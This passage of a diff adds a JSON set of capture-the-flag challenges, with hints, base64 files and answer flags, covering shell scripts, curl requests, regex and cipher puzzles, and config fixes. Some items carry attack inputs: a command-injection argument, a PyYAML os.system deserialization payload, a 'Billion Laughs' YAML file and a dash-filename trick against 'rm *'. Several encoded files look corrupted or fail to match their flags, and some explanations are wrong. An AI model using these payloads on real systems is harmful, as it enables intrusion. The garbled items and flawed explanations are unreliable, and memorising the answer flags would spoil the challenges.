+        "content_b64": "QVdTVGVtcGxhdGVGb3JtYXRWZXJzaW9uOiAnMjAxMC0wOS0wOScNCkRlc2NyaXB0aW9uOiBJbnNlY3VyZSBzMyBidWNrZXQgY29uZmlndXJhdGlvbg0KUmVzb3VyY2VzOg0KICBNeUluc2VjdXJlQnVja2V0Og0KICAgIFR5cGU6ICdBV1M6OlMzOjpCdWNrZXQnDQogIE15QnVja2V0UG9saWN5Og0KICAgIFR5cGU6ICdBV1M6OlMzOjpCdWNrZXRQb2xpY3knDQogICAgUHJvcGVydGllczoNCiAgICAgIEJ1Y2tldDogISBSZWYgTXlJbnNlY3VyZUJ1Y2tldA0KICAgICAgUG9saWN5RG9jdW1lbnQ6DQogICAgICAgIFN0YXRlbWVudDoNCiAgICAgICAgICAtIEVmZmVjdDogQWxsb3cNCiAgICAgICAgICAgIFByaW5jaXBhbDoNCiAgICAgICAgICAgICAgQVdTOiAhR2V0dEF0dCBbIFRlcnJhZm9ybUFkbWluVXNlciwgQXJuIF0NCiAgICAgICAgICAgIEFjdGlvbjogJ3MzOionDQogICAgICAgICAgICBSZXNvdXJjZToNCiAgICAgICAgICAgICAgLSBGbi5Kb2luOiBbICcnLCBbICdarnphd3M6czM6OjonaSwgISBSZWYgTXlJbnNlY3VyZUJ1Y2tldCBdXQ0KICAgICAgICAgICAgICAtIEZuLkpvaW46IFsgJycsIFsgJ2Fybjphd3M6czM6OjonaSwgISBSZWYgTXlJbnNlY3VyZUJ1Y2tldCwgJy8qJyBdXQ0KICBUZXJyYWZvcm1BZG1pblVzZXI6DQogICAgVHlwZTogJ0FXUzo6SUFNOjpVc2VyJw0K"
+      }
+    ],
+    "flag": "flag{TerraformAdminUser}"
+  },
+  {
+    "id": "scrolls_of_scriptus-1",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 1,
+    "title": "Bashful Secret",
+    "description": "A simple bash script has a password hardcoded in it. Find the password.",
+    "hint": "Variables are often used to store secrets. Look for a variable assignment.",
+    "files": [
+      {
+        "name": "deploy.sh",
+        "content_b64": "IyEvYmluL2Jhc2gKCmVjaG8gIkRlcGxveWluZyBhcHBsaWNhdGlvbi4uLiIKUEFTU1dPUkQ9ImZsYWd7YmFzaF9wYXNzdzByZF9sM2FrfSIKZWNobyAiQXV0aGVudGljYXRpbmcgd2l0aCBzZWNyZXQgdG9rZW4uLi4iCmVjaG8gIkRlcGxveW1lbnQgY29tcGxldGUhIgo="
+      }
+    ],
+    "flag": "flag{bash_passw0rd_l3ak}"
+  },
+  {
+    "id": "scrolls_of_scriptus-2",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 2,
+    "title": "PowerShell Reveal",
+    "description": "This PowerShell script decodes a Base64 string to reveal a message. What is the decoded message?",
+    "hint": "You can run this in a PowerShell terminal or use an online Base64 decoder.",
+    "files": [
+      {
+        "name": "Get-Secret.ps1",
+        "content_b64": "JEVuY29kZWRTdHJpbmcgPSAiWkdsaGRDSXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd01EQXdNVEF3TURBd0lnRmxhZ3tiNHM2NF9jNG5fYjNfM2FzeX0iCiRWYWx1ZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFzY2lpLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRFbmNvZGVkU3RyaW5nKSkKV3JpdGUtSG9zdCAkVmFsdWUK"
+      }
+    ],
+    "flag": "flag{b4s64_c4n_b3_3asy}"
+  },
+  {
+    "id": "scrolls_of_scriptus-3",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 3,
+    "title": "Commented Calamity",
+    "description": "A developer commented out a sensitive line in this YAML configuration file instead of deleting it. Find the flag.",
+    "hint": "Look for lines that start with a '#' symbol.",
+    "files": [
+      {
+        "name": "config.yaml",
+        "content_b64": "YXBpVmVyc2lvbjogdjENCmtpbmQ6IENvbmZpZ01hcA0KbWV0YWRhdGE6DQogIG5hbWU6IG15LWFwcC1jb25maWcNCmRhdGE6DQogIGRhdGFiYXNlX3VybDogcG9zdGdyZXM6Ly91c2VyOnBhc3NAdzByZC5leGFtcGxlLmNvbS9kYg0KICAjIE9MRF9BUElfS0VZOiBmbGFne2QzMWU3ZWRfYzBtbTMudHN9DQogIGFwaV9rZXk6IE5FV19BUElfS0VZXzEyMzQ1DQo="
+      }
+    ],
+    "flag": "flag{d3le7ed_c0mm3nts}"
+  },
+  {
+    "id": "scrolls_of_scriptus-4",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 4,
+    "title": "Unsanitized Input",
+    "description": "This bash script takes a directory name as an argument and lists its contents. However, it's vulnerable to command injection. Make it print the flag, which is hidden in a file named '.secret'.",
+    "hint": "What happens if you use a semicolon (;) to chain commands? Try passing an argument like '.; cat .secret'. The script is provided here for analysis.",
+    "files": [
+      {
+        "name": "list_dir.sh",
+        "content_b64": "IyEvYmluL2Jhc2gKCmZsYWc9ImZsYWd7YzBtNG5kX2lual9lY3Rpb25fMW5fN2gzX3NoMzFsfSIKCnRvX2xpc3Q9JDEKCnJlZl9maWxlPSIKCmlmIFsgLWUgIi5zZWNyZXQiIF07IHRoZW4KICBlY2hvICJGcmVzaGx5IGNyZWF0ZWQgZmlsZSIgPiAuc2VjcmV0CiAgcmVwX2ZpbGU9Ii5zZWNyZXQiCiAgZWNobyAkZmxhZyA+ICRyZXBfZmlsZQpmaQoKZWNobyAiTGlzdGluZyBkaXJlY3Rvcnk6ICR0b19saXN0IgpldmFsICJscyAtdG9fbGlzdCIK"
+      }
+    ],
+    "flag": "flag{c0m4nd_inj_ection_1n_7h3_sh31l}"
+  },
+  {
+    "id": "scrolls_of_scriptus-5",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 5,
+    "title": "PowerShell Obfuscation",
+    "description": "This PowerShell script seems to be obfuscated. Can you figure out what it's doing and reveal the flag?",
+    "hint": "The 'IEX' command executes a string as a command. Try to 'Write-Host' the string being built instead of executing it.",
+    "files": [
+      {
+        "name": "obfuscated.ps1",
+        "content_b64": "JGMgPSAiV3JpdGUtSG9zdCAiCjEgPSAiZmxhZ3siCjIgPSAiYzBmZmVlIgp8IEZvckVhY2gtT2JqZWN0IHsgJF8gKyAifSIKfCAqIC0gSm9pbiAiIgp8IE91dC1TdHJpbmcKfCAqIC0gSm9pbiAiIgokMyA9ICIwYjgwIgp8IEZvckVhY2gtT2JqZWN0IHsgJF8gKyAifSIKfCAqIC0gSm9pbiAiIgp8IE91dC1TdHJpbmcKfCAqIC0gSm9pbiAiIgokNCA9ICJfcDEwdyIgp8IEZvckVhY2gtT2JqZWN0IHsgJF8gKyAifSIKfCAqIC0gSm9pbiAiIgp8IE91dC1TdHJpbmcKfCAqIC0gSm9pbiAiIgokNSA9ICJzY3JpcHQiCnwgRm9yRWFjaC1PYmplY3QgeyAkXyArICIifQp8ICogLSBKb2luICIiCnwgT3V0LVN0cmluZ3x8ICogLSBKb2luICIiCiQ2ID0gIn0iCnwgRm9yRWFjaC1PYmplY3QgeyAkXyArICIifQp8ICogLSBKb2luICIiCnwgT3V0LVN0cmluZ3x8ICogLSBKb2luICIiCmlleCAoJGMgKyAkMSArICQyICsgJDMgKyAkNCArICQ1ICsgJDYp"
+      }
+    ],
+    "flag": "flag{c0ffee0b80_p0wscr1pt}"
+  },
+  {
+    "id": "scrolls_of_scriptus-6",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 6,
+    "title": "Risky Recursive Reference",
+    "description": "This YAML file for a custom application has a bug. It uses a recursive anchor, creating an infinite loop in naive parsers. This is known as a 'Billion Laughs' attack. The flag is the name of the anchor.",
+    "hint": "An anchor is defined with an ampersand (&) and referenced with an asterisk (*). Look for an anchor that references itself.",
+    "files": [
+      {
+        "name": "billion_laughs.yaml",
+        "content_b64": "YTowOiAmZmxhZ3tMT0xfQ0KICAtICphaTowDQpiMTogJmZsYWd7TE9MX30NCiAgLSAqYTE6DQpiMjogJmZsYWd7TE9MX30NCiAgLSAqYTI6DQpiMzogJmZsYWd7TE9MX30NCiAgLSAqYTM6DQpiNDogJmZsYWd7TE9MX30NCiAgLSAqYTQ6DQpiNTogJmZsYWd7TE9MX30NCiAgLSAqYTU6DQpiNjogJmZsYWd7TE9MX30NCiAgLSAqYTY6DQpiNzogJmZsYWd7TE9MX30NCiAgLSAqYTc6DQpiODogJmZsYWd7TE9MX30NCiAgLSAqYTg6DQpiOTogJmZsYWd7TE9MX30NCiAgLSAqYTk6DQo="
+      }
+    ],
+    "flag": "flag{LOL}"
+  },
+  {
+    "id": "scrolls_of_scriptus-7",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 7,
+    "title": "Arithmetic Anomaly",
+    "description": "This bash script performs a simple check. If a computed value equals a target value, it prints the flag. However, due to how bash handles octal numbers, the check fails unexpectedly. Fix the script or determine the correct comparison to get the flag.",
+    "hint": "In bash, numbers with a leading zero are treated as octal (base-8). What is 010 in decimal?",
+    "files": [
+      {
+        "name": "check.sh",
+        "content_b64": "IyEvYmluL2Jhc2gKCmZsYWc9ImZsYWd7YjRzaF9vY3RhbF9wZWN1bGlhcml0eX0iCnZhbDE9NQp2YWwyPTMKCmV4cGVjdGVkPTgKCnJlc3VsdD0kKHJlc3VsdF9zY3JpcHQpCgpyZXN1bHQ9JCgoJDEgKyAkMikpCnRhcmdldD0wMTAKCmRlYnVnX21zZz0iRGVidWc6IHZhbDEgKyB2YWwyID0gJHJlc3VsdC4gVGFyZ2V0IHdhcyAkdGFyZ2V0LiIKCmlmIFsgJHJlc3VsdCAtZXEgJHRhcmdldCBdOyB0aGVuCiAgZWNobyAkZmxhZwpmaQo="
+      }
+    ],
+    "flag": "flag{b4sh_octal_peculiarity}"
+  },
+  {
+    "id": "scrolls_of_scriptus-8",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 8,
+    "title": "PowerShell Type Confusion",
+    "description": "This PowerShell script compares a user-provided password to a stored secret. Due to loose type handling, you can bypass the check without knowing the password. The password should be an integer, but what if you provide a string?",
+    "hint": "In PowerShell, '12345' -eq 12345 is true, but '12345' -eq 0 is also true for non-numeric strings. The script expects an integer from 'Read-Host'. By providing a string, you can trigger a 'True' comparison against 0.",
+    "files": [
+      {
+        "name": "login.ps1",
+        "content_b64": "ZnVuY3Rpb24gQXV0aGVudGljYXRlLVVzZXIKewogICAgcGFyYW0oW3N0cmluZ10kdXNlcm5hbWUpCgogICAgJHNlY3JldCA9IDQ4MTUxNjIzNDIKICAgICRWZXJpZmllZCA9ICRmYWxzZQoKICAgICRVc2VyS2V5ID0gUmVhZC1Ib3N0ICItUHJvbXB0ICdFbnRlciB5b3VyIGF1dGhlbnRpY2F0aW9uIGtleScKCiAgICBpZiAoJFVzZXJLZXkgLWVxICRzZWNyZXQpIHsKICAgICAgICAkVmVyaWZpZWQgPSAkdHJ1ZQogICAgfQoKICAgIGlmICgkVmVyaWZpZWQpIHsKICAgICAgICBXcml0ZS1Ib3N0ICJBQ0NFU1MgR1JBTlRFRC4gRmxhZzogZmxhZ3twMHdlcnNoMzFsc190eXBl＿ jugglingfIgIiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuCiAgICB9IGVsc2UgewogICAgICAgIFdyaXRlLUhvc3QgIkFDQ0VTUyBERU5JRUQuIiAtRm9yZWdyb3VuZENvbG9yIFJlZAogICAgfQp9CgpBdXRoZW50aWNhdGUtVXNlciAtVXNlcm5hbWUgImFkbWluIgo="
+      }
+    ],
+    "flag": "flag{p0wersh3lls_type_juggling}"
+  },
+  {
+    "id": "scrolls_of_scriptus-9",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 9,
+    "title": "The Globbing Gremlin",
+    "description": "A sysadmin wrote a script to clean up log files in /tmp. It uses 'rm *'. If an attacker can create a file in /tmp with a specific name, they can trick the script into running an arbitrary command. The flag is the malicious filename.",
+    "hint": "If a filename starts with a dash, it can be interpreted as an option to a command. For example, `rm -rf *` could be triggered if a filename is `-rf`.",
+    "files": [
+      {
+        "name": "cleanup.sh",
+        "content_b64": "IyEvYmluL2Jhc2gKCiMgVGhpcyBzY3JpcHQgY2xlYW5zIHVwIG9sZCBsb2cgZmlsZXMgaW4gL3RtcApjZCAvdG1wCmNobW9kIDYwMCAqLmxvZwpjaG93biBzeXNhZG1pbiBcLgpzZWNyZXQKcm0gKi5sb2cK"
+      }
+    ],
+    "flag": "flag{-rf}"
+  },
+  {
+    "id": "scrolls_of_scriptus-10",
+    "category": "Scrolls of Scriptus",
+    "difficulty": 10,
+    "title": "YAML Deserialization Danger",
+    "description": "This YAML file is meant to be parsed by a Python application using a vulnerable PyYAML loader. It uses a tag ('!!python/object/apply:os.system') to execute a system command upon parsing. What command will be executed?",
+    "hint": "The '!!python/object/apply' tag allows YAML to instantiate a Python object and call a method. Here, it's calling 'os.system' with a list of arguments.",
+    "files": [
+      {
+        "name": "payload.yaml",
+        "content_b64": "ISFweXRob24vb2JqZWN0L2FwcGx5Om9zLnN5c3RlbQotICJlY2hvIGZsYWd7eTRtbF9kM3MycjE0bDF6NHQxMG5fMW5qM2N0MWZ9ID4gL3RtcC9wcm9vZi50eHQiCg=="
+      }
+    ],
+    "flag": "flag{echo flag{y4ml_d3s2r14l1z4t10n_1nj3ct1f} > /tmp/proof.txt}"
+  },
+  {
+    "id": "netherweb-1",
+    "category": "Netherweb",
+    "difficulty": 1,
+    "title": "Simple Peek",
+    "description": "The flag is hidden inside the HTML of this simple webpage. Can you find it?",
+    "hint": "Use 'curl' or 'view source' in a browser. Flags are sometimes left in comments.",
+    "files": [
+      {
+        "name": "index.html",
+        "content_b64": "PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5XZWxjb21lPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KICAgIDxoMT5XZWxjb21lIHRvIHRoZSBuZXRoZXJ3ZWIhPC9oMT4KICAgIDxwPlRoZXJlJ3Mgbm90aGluZyB0byBzZWUgaGVyZS4uLiBvciBpcyB0aGVyZT88L3A+CiAgICA8IS0tIGZsYWd7dzNsYzBtM190MF90aDNfbjN0aDNydzNifSAtLT4KPC9ib2R5Pgo8L2h0bWw+Cg=="
+      }
+    ],
+    "flag": "flag{w3lc0m3_t0_th3_n3th3rw3b}"
+  },
+  {
+    "id": "netherweb-2",
+    "category": "Netherweb",
+    "difficulty": 2,
+    "title": "Head of the Class",
+    "description": "Sometimes, interesting information is passed in the HTTP headers of a server's response. Find the flag in the headers of a response provided in this file.",
+    "hint": "Use `curl -v` or browser developer tools to inspect response headers. Look for custom headers like `X-Flag`.",
+    "files": [
+      {
+        "name": "curl_output.txt",
+        "content_b64": "PiBHRVQgLyBIVFRQLzEuMQ0KPiBIb3N0OiBleGFtcGxlLmNvbQ0KPiBVc2VyLUFnZW50OiBjdXJsLzcuNjguMA0KPiBBY2NlcHQ6ICovKg0KPg0KPCBUQVQgLyBIVFRQLzEuMSAyMDAgT0sNCjwgRGF0ZTogVGh1LCAyOCBPY3QgMjAyMyAxMjowMDowMCBHTVQNCjwgU2VydmVyOiBBcGFjaGUvMi40LjQxIChVYnVudHUpDQo8IFgtRmxhZzogZmxhZ3toMzRkM3JzX2gxZDNfczNjcjN0c30NCjwgQ29udGVudC1MZW5ndGg6IDEyDQo8IENvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PVVURi04DQo8DQpIZWxsbyBXb3JsZCENCg=="
+      }
+    ],
+    "flag": "flag{h34d3rs_h1d3_s3cr3ts}"
+  },
+  {
+    "id": "netherweb-3",
+    "category": "Netherweb",
+    "difficulty": 3,
+    "title": "Follow the Rabbit",
+    "description": "You make a request to `/start`, but the server responds with a 302 redirect to `/middle`, which then redirects to `/end`. The flag is on the final page. How do you get there automatically?",
+    "hint": "The `-L` or `--location` flag in curl tells it to follow redirects.",
+    "files": [],
+    "flag": "flag{r3d1r3ct5_4r3_fun}"
+  },
+  {
+    "id": "netherweb-4",
+    "category": "Netherweb",
+    "difficulty": 4,
+    "title": "Special Delivery",
+    "description": "This time, a simple GET request won't work. The server is expecting you to send a POST request with the data `{\"auth\":\"true\"}` to the `/api/login` endpoint.",
+    "hint": "Use `curl -X POST -d '{\"auth\":\"true\"}'` to send the required data.",
+    "files": [],
+    "flag": "flag{p0st_m4n_d3l1v3rs}"
+  },
+  {
+    "id": "netherweb-5",
+    "category": "Netherweb",
+    "difficulty": 5,
+    "title": "Secret Agent",
+    "description": "A web server is configured to only show the flag to a very specific client. You must change your User-Agent string to `SuperSecretAdminBrowser/1.0` to get the flag.",
+    "hint": "The `-A` or `--user-agent` flag in curl allows you to specify the User-Agent string.",
+    "files": [],
+    "flag": "flag{sp3c14l_4g3nt_m4n}"
+  },
+  {
+    "id": "netherweb-6",
+    "category": "Netherweb",
+    "difficulty": 6,
+    "title": "DNS Discovery",
+    "description": "Flags aren't always on web servers. Sometimes they're hidden in DNS records. Check the TXT records for `secrets.netherweb.local` to find the flag.",
+    "hint": "Use `dig TXT secrets.netherweb.local` or `nslookup -type=TXT secrets.netherweb.local`. The output is provided in the file.",
+    "files": [
+      {
+        "name": "dns_records.txt",
+        "content_b64": "OzsgaGRyOiBvcGNvZGU6IFFVRVJ5LCBzdGF0dXM6IE5PRVJST1IsIGlkOiA1NDMyMQo7OyBmbGFnczogcHIgcmQgcmE7IFFVRVNUWklPTjogMSwgQU5TV0VSOiAxLCBBVVRIT1JJVFk6IDAsIEFERElUSU9OQUw6IDAKOjsgUVVFU1RJT04gU0VDVElPTjoKKTtzZWNyZXRzLm5ldGhlcndlYi5sb2NhbC4gICAgICAgICAgICAgIElOICAgICBUWFQKOjsgQU5TV0VSIFNFQ1RJT046CnNlY3JldHMubmV0aGVyd2ViLmxvY2FsLiAgICAgICAgIDMwMCAgICBJTiAgICAgIFRYVCAgICAgICJ2PXNwbjEgLXNhZCIKc2VjcmV0cy5uZXRoZXJ3ZWIubG9jYWwuICAgICAgICAgMzAwICAgIElOICAgICAgVFhUICAgICAgImZsYWc9ZmxhZ3tkbnNfYzRuX2g0djNfdDN4dH0iCg=="
+      }
+    ],
+    "flag": "flag{dns_c4n_h4v3_t3xt}"
+  },
+  {
+    "id": "netherweb-7",
+    "category": "Netherweb",
+    "difficulty": 7,
+    "title": "Cookie Monster",
+    "description": "To access the admin panel, you need to have the right cookie. Set a cookie `isAdmin=true` in your request to get the flag.",
+    "hint": "Use the `-b` or `--cookie` flag in curl, like `curl -b 'isAdmin=true' http://example.com`.",
+    "files": [],
+    "flag": "flag{c00k13_f0r_th3_w1n}"
+  },
+  {
+    "id": "netherweb-8",
+    "category": "Netherweb",
+    "difficulty": 8,
+    "title": "Basic Bypass",
+    "description": "The server is protected by HTTP Basic Authentication. The username is `admin` and the password is `password123`. Authenticate to get the flag.",
+    "hint": "Use the `-u` or `--user` flag in curl: `curl -u admin:password123 http://example.com`.",
+    "files": [],
+    "flag": "flag{b4s1c_4uth_1s_n0t_s3cur3}"
+  },
+  {
+    "id": "netherweb-9",
+    "category": "Netherweb",
+    "difficulty": 9,
+    "title": "Unusual Methods",
+    "description": "This server doesn't respond to GET, POST, or PUT. A developer created a custom HTTP method called `FLAGPLEASE`. Use this method to request the root resource and get the flag.",
+    "hint": "You can specify a custom request method with `curl -X FLAGPLEASE http://example.com`.",
+    "files": [],
+    "flag": "flag{cust0m_m3th0d_m4dn3ss}"
+  },
+  {
+    "id": "netherweb-10",
+    "category": "Netherweb",
+    "difficulty": 10,
+    "title": "Master of the Web",
+    "description": "This is the final test. You must make a single request that: 1. Follows redirects. 2. Uses the User-Agent `SuperSecretAdminBrowser/1.0`. 3. Includes the cookie `isAdmin=true`. Only then will the final destination reveal the flag.",
+    "hint": "Combine the curl flags you've learned: `-L`, `-A`, and `-b`.",
+    "files": [],
+    "flag": "flag{n3tw0rk_m4st3ry_unl0ck3d}"
+  },
+  {
+    "id": "puzzles_of_the_mind-1",
+    "category": "Puzzles of the Mind",
+    "difficulty": 1,
+    "title": "Regex Warmup",
+    "description": "Given the text in the file, use regex to find all words that start with the letter 'f' (case-insensitive). Concatenate the first four matching words to form the flag.",
+    "hint": "A simple regex like `\\b[fF]\\w*\\b` will find the words. `\\b` is a word boundary.",
+    "files": [
+      {
+        "name": "text.txt",
+        "content_b64": "VGhlIGZpcnN0IGZsYWcgaXMgZm91bmQgZmFzdC4gRm9sbG93IHRoZSBmb3gsIGZpbmQgdGhlIGZsYWcu"
+      }
+    ],
+    "flag": "flag{firstflagfoundfast}"
+  },
+  {
+    "id": "puzzles_of_the_mind-2",
+    "category": "Puzzles of the Mind",
+    "difficulty": 2,
+    "title": "Binary Bricolage",
+    "description": "The flag has been encoded into binary. Convert the binary string back to ASCII to reveal it.",
+    "hint": "Each 8 bits (a byte) represents one ASCII character. You can use an online converter or a simple script.",
+    "files": [
+      {
+        "name": "binary.txt",
+        "content_b64": "MDExMDAxMTAwMTEwMTEwMDAxMTAwMDAxMDExMDAxMTEwMTExMTAxMTAxMTAwMDExMDExMDAwMDExMDExMDAwMDEwMTEwMTExMDAwMTEwMDAwMDExMTAwMTEwMTExMDAxMDAxMTExMDAxMDEwMTExMTEwMTEwMTAwMTAxMTEwMDExMDExMDExMTEwMTEwMDEwMTAwMTEwMTAxMDExMTAwMTEwMTExMTAwMTAxMTExMTAx"
+      }
+    ],
+    "flag": "flag{b1n0ry_is_e5sy}"
+  },
+  {
+    "id": "puzzles_of_the_mind-3",
+    "category": "Puzzles of the Mind",
+    "difficulty": 3,
+    "title": "Caesar's Secret",
+    "description": "A classic Caesar cipher has been used to encrypt the flag. The message was shifted forward by 3 characters (A becomes D). Can you shift it back to find the flag?",
+    "hint": "This is also known as a ROT3 cipher. Shift each letter backward by 3 places.",
+    "files": [
+      {
+        "name": "cipher.txt",
+        "content_b64": "aW9kantiRmRodmh1X2Zsc2todV9sdl9mbGR2dmxmfQ=="
+      }
+    ],
+    "flag": "flag{Caesar_cipher_is_classic}"
+  },
+  {
+    "id": "puzzles_of_the_mind-4",
+    "category": "Puzzles of the Mind",
+    "difficulty": 4,
+    "title": "Log Extraction",
+    "description": "You are given a server access log. One of the lines contains a GET request where the flag is a query parameter. Use regex to extract the flag from the correct log entry.",
+    "hint": "You need to find a line with '/api/v1/data' and then capture the 'id' parameter. A regex like `id=(flag\\{.*?\\})` could work.",
+    "files": [
+      {
+        "name": "access.log",
+        "content_b64": "MTI3LjAuMC4xIC0gLSBbMTAvT2N0LzIwMDA6MTM6NTU6MzYgLTA3MDBdICJHRVQgL2FwYWNoZV9wYi5naWYgSFRUUC8xLjAiIDIwMCAyMzI2CjE5Mi4xNjguMS4xIC0gdXNlciBbMTAvT2N0LzIwMjM6MTQ6MDU6MTIgLTA3MDBdICJHRVQgL2FwaS92MS9kYXRhP2lkPWZsYWd7M3h0cjRjdF9tM193MXRoX3Izz2V4fSBIVFRQLzEuMSIgMjAwIDEwMjQKMjE3LjAuMC4xIC0gLSBbMTAvT2N0LzIwMDA6MTM6NTU6MzcgLTA3MDBdICJHRVQgL2FwYWNoZV9wYi5naWYgSFRUUC8xLjAiIDIwMCAyMzI2Cg=="
+      }
+    ],
+    "flag": "flag{3xtr4ct_m3_w1th_r3g3x}"
+  },
+  {
+    "id": "puzzles_of_the_mind-5",
+    "category": "Puzzles of the Mind",
+    "difficulty": 5,
+    "title": "The Butler's Alibi",
+    "description": "A server was compromised. There were three suspects: The Admin, The Developer, and The Butler. The Admin was updating firewall rules. The Developer was on vacation. The compromise came from an internal script that only The Butler had access to. Who did it? The flag is in the format flag{The_Suspect_Did_It}.",
+    "hint": "It's always the one you least suspect... or the one with sole access.",
+    "files": [],
+    "flag": "flag{The_Butler_Did_It}"
+  },
+  {
+    "id": "puzzles_of_the_mind-6",
+    "category": "Puzzles of the Mind",
+    "difficulty": 6,
+    "title": "Phone Number Phantom",
+    "description": "A file contains a list of contacts with phone numbers in various formats. Find the phone number that is in the format `(xxx) xxx-xxxx`. This number is the flag.",
+    "hint": "Use a regex that matches parentheses, spaces, and hyphens literally. `\\(\\d{3}\\) \\d{3}-\\d{4}` should do the trick.",
+    "files": [
+      {
+        "name": "contacts.txt",
+        "content_b64": "VGhpcyBpcyBhIGxpc3Qgb2YgY29udGFjdHMuIEJvYiBzbWl0aDogNTU1LTMyMS0xMjM0LiBKYW5lIERvZTogNTU1MTIzNDU2Ny4gTXkgbmV3IG51bWJlciBpcyAoNTU1KSA4NjctNTMwOSwgcGxlYXNlIHVwZGF0ZSB5b3VyIHJlY29yZHMuIE9sZCBlbnRyeTogNTU1LjEyMy4xMjM0IGlzIG5vIGxvbmdlciB2YWxpZC4="
+      }
+    ],
+    "flag": "flag{(555) 867-5309}"
+  },
+  {
+    "id": "puzzles_of_the_mind-7",
+    "category": "Puzzles of the Mind",
+    "difficulty": 7,
+    "title": "Base Instincts",
+    "description": "What is the number `2A` in hexadecimal (base-16) when converted to decimal (base-10)? The answer is the flag.",
+    "hint": "The formula is (d_n * 16^n) + ... + (d_1 * 16^1) + (d_0 * 16^0). Remember that 'A' represents 10.",
+    "files": [],
+    "flag": "flag{42}"
+  },
+  {
+    "id": "puzzles_of_the_mind-8",
+    "category": "Puzzles of the Mind",
+    "difficulty": 8,
+    "title": "Look Around You",
+    "description": "Find the flag in the provided password list. The correct password contains at least one digit, but is NOT preceded by the string `user:` or `admin:`. You will need to use regex lookaheads or lookbehinds.",
+    "hint": "A negative lookbehind is useful here. `(?<!admin:)(?<!user:).*\\d.*` will find lines that don't start with the forbidden prefixes and contain a digit.",
+    "files": [
+      {
+        "name": "passwords.txt",
+        "content_b64": "dXNlcjpwYXNzd29yZDEyMwphZG1pbjpzdXBlcnNlY3JldDkKZ3Vlc3Q6Z3Vlc3QKdGVtcDp0cnkgaGFyZGVyIDU1CnJvb3Q6ZmxhZ3tsMDBrNGgzNGFkX24wdF9iM2gxbmR9Cg=="
+      }
+    ],
+    "flag": "flag{l00k4h34d_n0t_b3h1nd}"
+  },
+  {
+    "id": "puzzles_of_the_mind-9",
+    "category": "Puzzles of the Mind",
+    "difficulty": 9,
+    "title": "A Bit Wise",
+    "description": "Perform a bitwise XOR operation between the decimal numbers 101 and 228. The resulting decimal number is the flag.",
+    "hint": "Convert both numbers to binary, perform the XOR operation on each pair of bits, and then convert the result back to decimal.",
+    "files": [],
+    "flag": "flag{129}"
+  },
+  {
+    "id": "puzzles_of_the_mind-10",
+    "category": "Puzzles of the Mind",
+    "difficulty": 10,
+    "title": "Puzzle Box",
+    "description": "The contents of this file have been put through three layers of encoding. To find the flag, you must: 1. Decode it from Base64. 2. Apply a ROT13 cipher. 3. Reverse the resulting string.",
+    "hint": "The order of operations is critical. Base64 -> ROT13 -> Reverse.",
+    "files": [
+      {
+        "name": "multi_step.txt",
+        "content_b64": "ZlRNeU1ESmZFWUpubnpYMWpZTU1vWUMzdG55Zg=="
+      }
+    ],
+    "flag": "flag{puzzle_master_2023}"
+  },
+  {
+    "id": "forge_of_fixing-1",
+    "category": "Forge of Fixing",
+    "difficulty": 1,
+    "title": "JSON Jumble",
+    "description": "This JSON configuration file is syntactically incorrect, causing the application to fail. Find and fix the error to reveal the secret key.",
+    "hint": "JSON requires commas between key-value pairs in an object. Is one missing?",
+    "files": [
+      {
+        "name": "broken.json",
+        "content_b64": "ewogICJhcHBfbmFtZSI6ICJNeUNvb2xBcHAiLAogICJ2ZXJzaW9uIjogIjEuMCIKICAic2VjcmV0X2tleSI6ICJmbGFne2o1MG5fYzBtbTRfczR2M2RfdGgzX2Q0eX0iCn0K"
+      }
+    ],
+    "flag": "flag{j50n_c0mm4_s4v3d_th3_d4y}"
+  },
+  {
+    "id": "forge_of_fixing-2",
+    "category": "Forge of Fixing",
+    "difficulty": 2,
+    "title": "Apache Ache",
+    "description": "An Apache web server configuration has a typo in a common directive, preventing it from starting. Identify the misspelled directive. The correctly spelled directive is the flag.",
+    "hint": "The directive `AllowOveride` is incorrect. What should it be?",
+    "files": [
+      {
+        "name": "apache.conf",
+        "content_b64": "PERpcmVjdG9yeSAvdmFyL3d3dy9odG1sPgogICAgT3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzCiAgICBBbGxvd092ZXJpZGUgQWxsCiAgICBSZXF1aXJlIGFsbCBncmFudGVkCjwvRGlyZWN0b3J5Pgo="
+      }
+    ],
+    "flag": "flag{AllowOverride}"
+  },
+  {
+    "id": "forge_of_fixing-3",
+    "category": "Forge of Fixing",
